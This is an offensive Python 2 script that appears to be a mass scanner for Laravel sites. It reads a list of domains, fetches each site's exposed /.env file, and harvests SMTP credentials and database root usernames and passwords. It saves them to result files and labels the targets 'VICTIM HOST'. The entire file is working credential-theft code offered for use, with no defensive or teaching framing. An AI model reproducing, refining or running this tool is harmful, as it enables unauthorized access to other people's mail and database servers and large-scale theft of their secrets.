#!/usr/bin/python
# -*- coding: utf-8 -*-
# Environment Laravel 
# [ GET SMTP & GET username ROOT (Maybe u can get it DATABASE or VPS) ]
# 
# @Author : ZeroByte.ID
# @Github : github.com/zerobyte-id
# 
# 
import threading
import requests
import random
import datetime
import re
from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer

class bcolors:

    HEADER = '\033[95m'

    OKBLUE = '\033[94m'

    OKGREEN = '\033[92m'

    WARNING = '\033[93m'

    FAIL = '\033[91m'

    ENDC = '\033[0m'

    BOLD = '\033[1m'

    WHITE = '\033[1;37m'

print bcolors.WHITE
print"""
    __                                __ 
   / /   ____ __________ __   _____  / / 
  / /   / __ `/ ___/ __ `/ | / / _ \/ /  
 / /___/ /_/ / /  / /_/ /| |/ /  __/ /___
/_____/\__,_/_/   \__,_/ |___/\___/_____/
                              Environment
                         -- ZeroByte.ID --"""
print bcolors.FAIL + "[ * ] Get SMTP or Access root VPS / DATABASE [ * ]"
print bcolors.ENDC

def kuy(lEnVy):

	try:
		eNv = "http://{}/.env".format(lEnVy)

		headers = {
		    'Connection': 'keep-alive',
		    'Cache-Control': 'max-age=0',
		    'Upgrade-Insecure-Requests': '1',
		    'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
		    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		    'Accept-Encoding': 'gzip, deflate',
		    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
		}

		rsmTP = requests.get(eNv, headers=headers, allow_redirects=True, timeout=3)

		if "mailtrap.io" in rsmTP.text:

			print("\033[1;31;40m")

			print "[ - ] NOT FOUND SMTP [ - ] \n"

		elif rsmTP.status_code == 200:
			
			if "APP_NAME" in rsmTP.text:
				
				UEnVy.write(eNv + '\n')

			print("\033[1;32;40m")

			if "MAIL_HOST" in rsmTP.text:

				SMTP = re.findall('MAIL_HOST=(.*)', rsmTP.text)

				PORT = re.findall('MAIL_PORT=(.*)', rsmTP.text)

				USERNAME = re.findall('MAIL_USERNAME=(.*)', rsmTP.text)

				PASSWORD = re.findall('MAIL_PASSWORD=(.*)', rsmTP.text)

				MENCRYPTION = re.findall('MAIL_ENCRYPTION=(.*)', rsmTP.text)

				if "smtp.mailtrap.io" in SMTP:

					print("\033[1;31;40m")

					print "[ - ] NOT FOUND SMTP [ - ] \n"

				elif "localhost" in SMTP:

					print("\033[1;31;40m")

					print "[ - ] NOT FOUND SMTP [ - ] \n"

				elif "null" in SMTP:

					print("\033[1;31;40m")

					print "[ - ] NOT FOUND SMTP [ - ] \n"

				else:

					print "[ + ] FOUND SMTP [ + ]"

					print "\n= = = = = = = = = = = = = = = = = = = = = = = ="

					print "VICTIM HOST     => {}".format(eNv)

					print "SMTP HOST       => {}".format(SMTP[0])

					print "SMTP PORT       => {}".format(PORT[0])

					print "SMTP USERNAME   => {}".format(USERNAME[0])

					print "SMTP PASSWORD   => {}".format(PASSWORD[0])

					print "SMTP ENCRYPTION => {}".format(MENCRYPTION[0])

					print "= = = = = = = = = = = = = = = = = = = = = = = ="

					SEnVy.write('VICTIM URL : ' + eNv + '\nSMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n\n')



			elif "SMTP_HOST" in rsmTP.text:

				SMTP = re.findall('SMTP_HOST=(.*)', rsmTP.text)

				PORT = re.findall('SMTP_PORT=(.*)', rsmTP.text)

				USERNAME = re.findall('SMTP_USERNAME=(.*)', rsmTP.text)

				PASSWORD = re.findall('SMTP_PASSWORD=(.*)', rsmTP.text)

				MENCRYPTION = re.findall('SMTP_ENCRYPTION=(.*)', rsmTP.text)

				if "smtp.mailtrap.io" in SMTP:

					print("\033[1;31;40m")

					print "[ - ] NOT FOUND SMTP [ - ] \n"

				elif "localhost" in SMTP:

					print("\033[1;31;40m")

					print "[ - ] NOT FOUND SMTP [ - ] \n"

				elif "null" in SMTP:

					print("\033[1;31;40m")

					print "[ - ] NOT FOUND SMTP [ - ] \n"

				else:

					print "\n= = = = = = = = = = = = = = = = = = = = = = = ="

					print "VICTIM HOST     => {}".format(eNv)

					print "SMTP HOST       => {}".format(SMTP[0])

					print "SMTP PORT       => {}".format(PORT[0])

					print "SMTP USERNAME   => {}".format(USERNAME[0])

					print "SMTP PASSWORD   => {}".format(PASSWORD[0])

					print "SMTP ENCRYPTION => {}".format(MENCRYPTION[0])

					print "= = = = = = = = = = = = = = = = = = = = = = = ="

					SEnVy.write('VICTIM URL : ' + eNv + '\nSMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n\n')

			elif "mailtrap.io" in rsmTP.text:

				print("\033[1;31;40m")

				print "[ - ] NOT FOUND SMTP [ - ] \n"

			elif "DB_USERNAME=root" in rsmTP.text:

				ROOTU = re.findall('DB_USERNAME=(.*)', rsmTP.text)

				ROOTP = re.findall('DB_PASSWORD=(.*)', rsmTP.text)

				print bcolors.WARNING + "[ + ] Maybe you can get VPS / DATABASE [+]"
				
				REnVy.write('HOSTS : ' + lEnVy + '\nUSERNAME : ' + ROOTU[0] + '\nPASSWORD : ' + ROOTP[0] + '\n\n')

		

		elif rsmTP.status_code == 302:
			
			if "APP_NAME" in rsmTP.text:
				
				UEnVy.write(eNv + '\n')

			if "MAIL_HOST" in rsmTP.text:

				SMTP = re.findall('MAIL_HOST=(.*)', rsmTP.text)

				PORT = re.findall('MAIL_PORT=(.*)', rsmTP.text)

				USERNAME = re.findall('MAIL_USERNAME=(.*)', rsmTP.text)

				PASSWORD = re.findall('MAIL_PASSWORD=(.*)', rsmTP.text)

				MENCRYPTION = re.findall('MAIL_ENCRYPTION=(.*)', rsmTP.text)

				if "smtp.mailtrap.io" in SMTP:

					print("\033[1;31;40m")

					print "[ - ] NOT FOUND SMTP [ - ] \n"

				elif "localhost" in SMTP:

					print("\033[1;31;40m")

					print "[ - ] NOT FOUND SMTP [ - ] \n"

				elif "null" in SMTP:

					print("\033[1;31;40m")

					print "[ - ] NOT FOUND SMTP [ - ] \n"

				else:

					print "[ + ] FOUND SMTP [ + ]"

					print "\n= = = = = = = = = = = = = = = = = = = = = = = ="

					print "VICTIM HOST     => {}".format(eNv)

					print "SMTP HOST       => {}".format(SMTP[0])

					print "SMTP PORT       => {}".format(PORT[0])

					print "SMTP USERNAME   => {}".format(USERNAME[0])

					print "SMTP PASSWORD   => {}".format(PASSWORD[0])

					print "SMTP ENCRYPTION => {}".format(MENCRYPTION[0])

					print "= = = = = = = = = = = = = = = = = = = = = = = ="

					SEnVy.write('VICTIM URL : ' + eNv + '\nSMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n\n')
					



			elif "SMTP_HOST" in rsmTP.text:

				SMTP = re.findall('SMTP_HOST=(.*)', rsmTP.text)

				PORT = re.findall('SMTP_PORT=(.*)', rsmTP.text)

				USERNAME = re.findall('SMTP_USERNAME=(.*)', rsmTP.text)

				PASSWORD = re.findall('SMTP_PASSWORD=(.*)', rsmTP.text)

				MENCRYPTION = re.findall('SMTP_ENCRYPTION=(.*)', rsmTP.text)

				if "smtp.mailtrap.io" in SMTP:

					print("\033[1;31;40m")

					print "[ - ] NOT FOUND SMTP [ - ] \n"

				elif "localhost" in SMTP:

					print("\033[1;31;40m")

					print "[ - ] NOT FOUND SMTP [ - ] \n"

				elif "null" in SMTP:

					print("\033[1;31;40m")

					print "[ - ] NOT FOUND SMTP [ - ] \n"

				else:

					print "[ + ] FOUND SMTP [ + ]"

					print "\n= = = = = = = = = = = = = = = = = = = = = = = ="

					print "VICTIM HOST     => {}".format(eNv)

					print "SMTP HOST       => {}".format(SMTP[0])

					print "SMTP PORT       => {}".format(PORT[0])

					print "SMTP USERNAME   => {}".format(USERNAME[0])

					print "SMTP PASSWORD   => {}".format(PASSWORD[0])

					print "SMTP ENCRYPTION => {}".format(MENCRYPTION[0])

					print "= = = = = = = = = = = = = = = = = = = = = = = ="

					SEnVy.write('VICTIM URL : ' + eNv + '\nSMTP HOST : ' + SMTP[0] + '\nSMTP PORT : ' + PORT[0] + '\nSMTP USER : ' + USERNAME[0] + '\nSMTP PASSWORD : ' + PASSWORD[0] + '\nSMTP ENCRYPTION : ' + MENCRYPTION[0] + '\n\n')


			elif "DB_USERNAME=root" in rsmTP.text:

				ROOTU = re.findall('DB_USERNAME=(.*)', rsmTP.text)

				ROOTP = re.findall('DB_PASSWORD=(.*)', rsmTP.text)

				print bcolors.WARNING + "[ + ] Maybe you can get VPS / DATABASE [+]"

				REnVy.write('HOSTS : ' + lEnVy + '\nUSERNAME : ' + ROOTU[0] + '\nPASSWORD : ' + ROOTP[0] + '\n\n')

		else:

			print bcolors.FAIL + "[ - ] CAN'T FOUND BUG [ - ]"

	except:

		pass


def Main():


    try:

        start = timer()

        pp = ThreadPool(6)

        pr = pp.map(kuy, lEnVy)      

        print bcolors.ENDC

        print('Time: ' + str(timer() - start) + ' seconds')

        pr.join()

    except:

        pass

try:

	li = raw_input(" [ - ] Input your file domain list : ")

	lEnVy = open(li, "r").read().split()

	lEnVy.sort() # Sort (A - Z)

except IOError:

    pass

bNyak = len(list(lEnVy)) # Banyak line

print " [ + ] Total Domain : {} \n".format(bNyak)
SEnVy = open("SMTP-Result.txt", 'w')
REnVy = open("ROOT-Result.txt", 'w')
UEnVy = open("ENV-URL-Result.txt", 'w')
Main()
SEnVy.close()
REnVy.close()
UEnVy.close()
